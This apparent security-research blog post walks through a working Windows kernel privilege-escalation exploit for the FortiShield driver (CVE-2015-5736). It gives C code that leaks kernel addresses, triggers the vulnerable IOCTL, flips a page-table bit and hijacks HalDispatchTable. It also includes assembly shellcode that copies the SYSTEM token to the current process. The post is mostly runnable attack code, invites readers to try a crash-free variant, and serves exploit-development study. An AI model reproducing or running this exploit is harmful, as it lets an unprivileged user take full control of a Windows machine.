<p>The trigger_callback() function creates some files and then moves them which will trigger the callback we set with the CVE-2015-5736 IOCTL.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">trigger_callback</span><span class="p">()</span>
<span class="p">{</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[+] Creating dummy file</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	<span class="n">system</span><span class="p">(</span><span class="s">"echo test &gt; C:</span><span class="se">\\</span><span class="s">Users</span><span class="se">\\</span><span class="s">n00b</span><span class="se">\\</span><span class="s">AppData</span><span class="se">\\</span><span class="s">LocalLow</span><span class="se">\\</span><span class="s">test.txt"</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[+] Creating dummy file 2</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	<span class="n">system</span><span class="p">(</span><span class="s">"echo test &gt; C:</span><span class="se">\\</span><span class="s">Users</span><span class="se">\\</span><span class="s">n00b</span><span class="se">\\</span><span class="s">AppData</span><span class="se">\\</span><span class="s">LocalLow</span><span class="se">\\</span><span class="s">test3.txt"</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[+] Calling MoveFileEx()</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

	<span class="n">BOOL</span> <span class="n">MFEresult</span> <span class="o">=</span> <span class="n">MoveFileEx</span><span class="p">(</span><span class="s">L"C:</span><span class="se">\\</span><span class="s">Users</span><span class="se">\\</span><span class="s">n00b</span><span class="se">\\</span><span class="s">AppData</span><span class="se">\\</span><span class="s">LocalLow</span><span class="se">\\</span><span class="s">test.txt"</span><span class="p">,</span> <span class="s">L"C:</span><span class="se">\\</span><span class="s">Users</span><span class="se">\\</span><span class="s">n00b</span><span class="se">\\</span><span class="s">AppData</span><span class="se">\\</span><span class="s">LocalLow</span><span class="se">\\</span><span class="s">test2.txt"</span><span class="p">,</span> <span class="n">MOVEFILE_REPLACE_EXISTING</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">MFEresult</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[!] Error while calling MoveFileEx(): %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
		<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>This chunk is the start of the main() function. It begins with opening handles to the  mdare and fortishield drivers.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>

	<span class="n">HANDLE</span> <span class="n">mdare</span> <span class="o">=</span> <span class="n">CreateFile</span><span class="p">(</span><span class="s">L"</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">mdareDriver_48"</span><span class="p">,</span> <span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">mdare</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[!] Error while creating a handle to the driver: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
		<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="n">HANDLE</span> <span class="n">forti</span> <span class="o">=</span> <span class="n">CreateFile</span><span class="p">(</span><span class="s">L"</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">FortiShield"</span><span class="p">,</span> <span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">forti</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[!] Error while creating a handle to the driver: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
		<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
</code></pre></div></div>
<p>This chunk declares the eProcess variable, sets the name of the exploit to grab the EPROCESS of and passes it to GetEprocessAddress. It then pulls the KTHREAD with the walkEprocess() function and leaks the ntBase address with leakNtBase(). It then sets the stack pivot gadget address to the ntPivot variable and finds the start of the PTE address range by leaking nt!MiGetPteAddress+0x13 offset. This offset address is found by doing dqs or u nt!MiGetPteAddress+0x13 in the WinDbg. It then leaks the base address of fortishield with the leakFortiBase() function and sets the fortishield_callback and fortishield_restore variables. These variables are used to hijack and restore execution in the vulnerable fortishield IOCTL.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="n">ULONGLONG</span> <span class="n">eProcess</span><span class="p">;</span>
	<span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">forti_exploit</span> <span class="o">=</span> <span class="s">"kstack.exe"</span><span class="p">;</span>
	<span class="n">eProcess</span> <span class="o">=</span> <span class="n">GetEprocessAddress</span><span class="p">(</span><span class="n">forti_exploit</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[+] EPROCESS found %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">eProcess</span><span class="p">);</span>
	<span class="n">ULONGLONG</span> <span class="n">kThread</span> <span class="o">=</span> <span class="n">walkEprocess</span><span class="p">(</span><span class="n">mdare</span><span class="p">,</span> <span class="n">eProcess</span><span class="p">);</span>
	<span class="n">ULONGLONG</span> <span class="n">ntBase</span> <span class="o">=</span> <span class="n">leakNtBase</span><span class="p">(</span><span class="n">mdare</span><span class="p">,</span> <span class="n">kThread</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[+] ntoskrnl.exe base address is: 0x%llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ntBase</span><span class="p">);</span>
	<span class="n">ULONGLONG</span> <span class="n">ntPivot</span> <span class="o">=</span> <span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x20bbc2</span><span class="p">;</span> <span class="c1">// mov esp, 0xB60F0020 ; ret // mov esp, 0xf6000000; retn;</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[+] stack pivot gadget found: 0x%llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ntPivot</span><span class="p">);</span>
	<span class="n">ULONGLONG</span> <span class="n">ntMiGetPteAddressOffset</span> <span class="o">=</span> <span class="n">leakQWORD</span><span class="p">(</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x33273B</span><span class="p">,</span> <span class="n">mdare</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[+] ntMiGetPteAddressOffset is: 0x%llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ntMiGetPteAddressOffset</span><span class="p">);</span>
	<span class="n">ULONGLONG</span> <span class="n">fortishieldBase</span> <span class="o">=</span> <span class="n">leakFortiBase</span><span class="p">(</span><span class="n">mdare</span><span class="p">,</span> <span class="n">ntBase</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[+] FortiShield.sys base address is: 0x%llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">fortishieldBase</span><span class="p">);</span>
	<span class="n">ULONGLONG</span> <span class="n">fortishield_callback</span> <span class="o">=</span> <span class="n">fortishieldBase</span> <span class="o">+</span> <span class="mh">0xd150</span><span class="p">;</span>
	<span class="n">ULONGLONG</span> <span class="n">fortishield_restore</span> <span class="o">=</span> <span class="n">fortishieldBase</span> <span class="o">+</span> <span class="mh">0x2f73</span><span class="p">;</span>
</code></pre></div></div>
<p>This chunk then prints the PTE Virtual Address start address and finds the PTE of the fake stack address with get_pxe_address_64 and then allocates the fake stack and builds the ROP chain with allocate_fake_stack().</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="n">printf</span><span class="p">(</span><span class="s">"[+] PTE VA start address is: 0x%llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ntMiGetPteAddressOffset</span><span class="p">);</span>


	<span class="n">ULONGLONG</span> <span class="n">pte_result</span> <span class="o">=</span> <span class="n">get_pxe_address_64</span><span class="p">(</span><span class="mh">0xB60f0000</span><span class="p">,</span> <span class="n">ntMiGetPteAddressOffset</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[+] PTE virtual address for 0x0B60F0100: %I64x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pte_result</span><span class="p">);</span>
	<span class="n">PULONGLONG</span> <span class="n">fake_stack</span> <span class="o">=</span> <span class="n">allocate_fake_stack</span><span class="p">(</span><span class="n">ntBase</span><span class="p">,</span> <span class="n">fortishield_callback</span><span class="p">,</span> <span class="n">fortishield_restore</span><span class="p">,</span> <span class="n">kThread</span><span class="p">);</span>
</code></pre></div></div>
<p>This chunk sets up the call to the vulnerable IOCTL for CVE-2015-5736, calls the IOCTL, and then triggers the callback with trigger_callback(). The getchar() calls allow for delaying the execution of code to help with troubleshooting and debugging. They can be commented out or removed.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="n">DWORD</span> <span class="n">IoControlCode</span> <span class="o">=</span> <span class="mh">0x220028</span><span class="p">;</span>
	<span class="n">ULONGLONG</span> <span class="n">InputBuffer</span> <span class="o">=</span> <span class="n">ntPivot</span><span class="p">;</span>
	<span class="n">DWORD</span> <span class="n">InputBufferLength</span> <span class="o">=</span> <span class="mh">0x8</span><span class="p">;</span>
	<span class="n">ULONGLONG</span> <span class="n">OutputBuffer</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
	<span class="n">DWORD</span> <span class="n">OutputBufferLength</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
	<span class="n">DWORD</span> <span class="n">lpBytesReturned</span><span class="p">;</span>

	<span class="n">getchar</span><span class="p">();</span>

	<span class="n">BOOL</span> <span class="n">triggerIOCTL</span> <span class="o">=</span> <span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">forti</span><span class="p">,</span> <span class="n">IoControlCode</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="o">&amp;</span><span class="n">InputBuffer</span><span class="p">,</span> <span class="n">InputBufferLength</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="o">&amp;</span><span class="n">OutputBuffer</span><span class="p">,</span> <span class="n">OutputBufferLength</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">lpBytesReturned</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="n">getchar</span><span class="p">();</span>
	<span class="n">trigger_callback</span><span class="p">();</span>
</code></pre></div></div>
<p>This chunk sleeps to ensure that the callback had enouugh time to finish and then allocates user-mode memory at 0x00000002a0000000, uses get_pxe_address64() to retrieve the PTE Virtual Address. It uses ReadProcessMemory to read the value and print it to the screen. It then stores the shellcode in the user-mode memory we allocated and uses the write NtWriteVirtualMemory write primitive to flip the U/S bit to make it appear to be in supervisor mode or kernel-mode.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="n">Sleep</span><span class="p">(</span><span class="mi">2000</span><span class="p">);</span>
	<span class="n">LPVOID</span> <span class="n">read_qword</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">));</span>
	<span class="n">SIZE_T</span> <span class="n">read_bytes</span><span class="p">;</span>
	<span class="n">memset</span><span class="p">(</span><span class="n">read_qword</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">));</span>

	<span class="n">PULONGLONG</span> <span class="n">ppte_base</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ntMiGetPteAddressOffset</span><span class="p">;</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">ppte_base</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[!] Error while reading from nt!MiGetPteAddress + 0x13</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[+] PTE base address: %llx </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">*</span><span class="n">ppte_base</span><span class="p">);</span>

	<span class="n">ULONGLONG</span> <span class="n">shellcode</span> <span class="o">=</span> <span class="mh">0x00000002a0000000</span><span class="p">;</span>
	<span class="n">LPVOID</span> <span class="n">allocation_sc</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">((</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">shellcode</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">allocation_sc</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[!] Error while allocating memory for the input buffer: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
		<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="n">memset</span><span class="p">(</span><span class="n">allocation_sc</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">);</span>

	<span class="n">memcpy</span><span class="p">((</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">allocation_sc</span> <span class="o">+</span> <span class="mh">0x08</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">TokenStealing</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">);</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">allocation_sc</span> <span class="o">+</span> <span class="mh">0x80</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">fortishield_callback</span><span class="p">;</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">allocation_sc</span> <span class="o">+</span> <span class="mh">0x88</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">fortishield_restore</span><span class="p">;</span>

	<span class="n">ULONGLONG</span> <span class="n">pte_base</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="o">*</span><span class="n">ppte_base</span><span class="p">;</span>
	<span class="n">ULONGLONG</span> <span class="n">pte_va</span> <span class="o">=</span> <span class="n">get_pxe_address_64</span><span class="p">(</span><span class="mh">0x00000002a0000000</span><span class="p">,</span> <span class="n">pte_base</span><span class="p">);</span>

	<span class="n">memset</span><span class="p">(</span><span class="n">read_qword</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">));</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ReadProcessMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">pte_va</span><span class="p">,</span> <span class="n">read_qword</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">read_bytes</span><span class="p">))</span>
	<span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[!] Error while calling ReadProcessMemory(): %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
	<span class="p">}</span>
	<span class="n">PULONGLONG</span> <span class="n">ppte_entry</span> <span class="o">=</span> <span class="p">(</span><span class="n">PULONGLONG</span><span class="p">)((</span><span class="n">ULONG_PTR</span><span class="o">*</span><span class="p">)</span><span class="n">read_qword</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[+] PTE flags: %llx </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">*</span><span class="n">ppte_entry</span><span class="p">);</span>
	<span class="c1">//Flip U/S bit</span>
	<span class="n">ULONGLONG</span> <span class="n">write_what</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="o">*</span><span class="n">ppte_entry</span> <span class="o">^</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span><span class="p">;</span>
	<span class="n">_NtWriteVirtualMemory</span> <span class="n">pNtWriteVirtualMemory</span> <span class="o">=</span> <span class="p">(</span><span class="n">_NtWriteVirtualMemory</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandleA</span><span class="p">(</span><span class="s">"ntdll.dll"</span><span class="p">),</span> <span class="s">"NtWriteVirtualMemory"</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">pNtWriteVirtualMemory</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[!] Error while resolving NtWriteVirtualMemory: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
		<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="n">pNtWriteVirtualMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">pte_va</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">write_what</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
</code></pre></div></div>
<p>This chunk uses the read primitive to retrieve the value of HalDispatchTable+0x08 so that we can save the original value that points to HaliQuerySystemInformation. It then saves the address on the fake stack so that the shellcode can reference it when it restores execution following the token steal. It then uses the write primitive to overwrite HalDispathTable+0x08 with the shellcode address and triggers the call to it with NtQueryIntervalProfile. The ULONG trash is just a ULONG variable declared to pass it’s pointer to NtQueryIntervalProfile and serves no other purpose.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
	<span class="n">ULONGLONG</span> <span class="n">HaliQuerySystemInformation</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0xc00a68</span><span class="p">;</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ReadProcessMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">HaliQuerySystemInformation</span><span class="p">,</span> <span class="n">read_qword</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">read_bytes</span><span class="p">))</span>
	<span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[!] Error while calling ReadProcessMemory(): %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
	<span class="p">}</span>
	<span class="n">PULONGLONG</span> <span class="n">orig_HaliQuerySystemInformation</span> <span class="o">=</span> <span class="p">(</span><span class="n">PULONGLONG</span><span class="p">)((</span><span class="n">ULONG_PTR</span><span class="o">*</span><span class="p">)</span><span class="n">read_qword</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[+] Oringial HaliQuerySystemInformation Address: %llx </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">*</span><span class="n">orig_HaliQuerySystemInformation</span><span class="p">);</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10200</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="o">*</span><span class="n">orig_HaliQuerySystemInformation</span><span class="p">;</span>

	<span class="n">getchar</span><span class="p">();</span>
	<span class="n">write_what</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">shellcode</span><span class="p">;</span>
	<span class="n">pNtWriteVirtualMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">HaliQuerySystemInformation</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">write_what</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="n">_NtQueryIntervalProfile</span> <span class="n">pNtQueryIntervalProfile</span> <span class="o">=</span> <span class="p">(</span><span class="n">_NtQueryIntervalProfile</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandleA</span><span class="p">(</span><span class="s">"ntdll.dll"</span><span class="p">),</span> <span class="s">"NtQueryIntervalProfile"</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">pNtQueryIntervalProfile</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[!] Error while resolving NtQueryIntervalProfile: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
		<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="n">ULONG</span> <span class="n">trash</span><span class="p">;</span>
	<span class="n">pNtQueryIntervalProfile</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">trash</span><span class="p">);</span>
</code></pre></div></div>
<p>This final chunk halts with getchar() to delay execution and then sleeps for 2 seconds, a little redundant but ensures a delay if you just happy click through. It then uses the write primitive to restore the HalDisptachTable+0x08 to HaliQuerySystemInformation and restores the PreviousMode on the KTHREAD before spawning cmd.exe and exiting.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="n">getchar</span><span class="p">();</span>
	<span class="n">Sleep</span><span class="p">(</span><span class="mi">2000</span><span class="p">);</span>
	<span class="c1">//restore the HalDispatchTable</span>
	<span class="n">write_what</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="o">*</span><span class="n">orig_HaliQuerySystemInformation</span><span class="p">;</span>
	<span class="n">pNtWriteVirtualMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">HaliQuerySystemInformation</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">write_what</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="c1">//restore Previous Mode on the KThread</span>
	<span class="n">memset</span><span class="p">(</span><span class="n">read_qword</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">));</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ReadProcessMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">kThread</span> <span class="o">+</span> <span class="mh">0x232</span><span class="p">),</span> <span class="n">read_qword</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">read_bytes</span><span class="p">))</span>
	<span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[!] Error while calling ReadProcessMemory(): %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
	<span class="p">}</span>
	<span class="n">PULONGLONG</span> <span class="n">kThreadPM</span> <span class="o">=</span> <span class="p">(</span><span class="n">PULONGLONG</span><span class="p">)((</span><span class="n">ULONG_PTR</span><span class="o">*</span><span class="p">)</span><span class="n">read_qword</span><span class="p">);</span>
	<span class="n">write_what</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="o">*</span><span class="n">kThreadPM</span> <span class="o">^</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">0</span><span class="p">;</span>
	<span class="n">pNtWriteVirtualMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">kThread</span> <span class="o">+</span> <span class="mh">0x232</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">write_what</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="n">system</span><span class="p">(</span><span class="s">"start cmd.exe"</span><span class="p">);</span>

	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="err">}</span>
</code></pre></div></div>
<p>This token stealing shellcode is in the repo <a href="https://github.com/ApexPredator-InfoSec/forti_shield/blob/main/kstack/token_stealing.asm">token_stealing.asm</a>. The token stealing shell code finds the EPROCESS of our current process and walks the ActiveProcessLink to find the SYSTEM Process with PID 4. It then copies its token over our token. It then restores register values and loads the original HaliQuerySystemInformation address to rax and performs a jmp rax. This restores execution to HaliQuerySystemInformation to avoid a bugcheck if we just return from our shellcode instead of continuing to the legitimate function we hijacked.</p>
<pre><code class="language-asm">_TEXT	SEGMENT

TokenStealing PROC
	get_eproc:
	nop
	nop
	nop
	nop
	nop
	push	rax										;save registers
	push	rcx										;
	push	r9										;
	push	r8										;
	xor     rax, rax								;Get the EPROCESS of current Process
	mov     rax, qword ptr gs:[rax+188h]			;
	mov     rax, qword ptr [rax+0B8h]				;
	mov     r8, rax									;
	parse_eproc:
	mov     rax, qword ptr [rax+448h]				;walk the linked process list to find SYSTEM process
	sub     rax, 448h								;
	mov     rcx, qword ptr [rax+440h]				;
	cmp     rcx, 4									;
	jne     parse_eproc								;
	steal_token:
	mov     r9, qword ptr [rax+4B8h]				;copy SYSTEM process token to current process
	mov     qword ptr [r8+4B8h], r9					;
	pop		r8										;restire registers
	pop		r9										;
	pop		rcx										;
	pop		rax										;we are about to overwrite this one but stack allignment is a thing
	mov		rax, qword ptr [0b60f0200h]				;HaliQuerySystemInformation
	jmp		rax
	ret

TokenStealing ENDP

_TEXT	ENDS

End
</code></pre>

<p>If we run this code we will see the VM freeze once it starts perfoming the HalDispatchTable hijack and when we switch to the debugger we see a crash with a 0x139 bugcheck. This was confusing to troubleshoot at first because it mentioned a stack overflow in the full dump from !analyze -v (that detailed dump does not work on my testing VM for this scenario for some reason). The code is actually a KERNEL_SECURITY_CHECK_FAILURE. Arguments 1-3 were null and not relevant in this crash, however, argument 4 showed the user-mode address allocated for the shellcode.
![[post2-bugcheck-run.png]]![[post2-windbg-bugcheck.png]]
If we were to use a double call to the CVE-2015-5736 ICOTL setting the callback to the user-mode address on the second call we would successfully get a SYSTEM command shell without a crash. I’ll save you reading space by not copying the full code here. There is only minor changes in the main() function and the shellcode. You can find the code on the repo <a href="https://github.com/ApexPredator-InfoSec/forti_shield/blob/main/doublecall.cpp">doublecall.cpp</a> <a href="https://github.com/ApexPredator-InfoSec/forti_shield/blob/main/doublecall.asm">doublecall.asm</a> Replace the code in the kstack.cpp file with the code from doublecall.cpp and replace the code in token_stealing.asm with the code in doublecall.asm if you want to try it out.
![[post2-doublecall.png]]
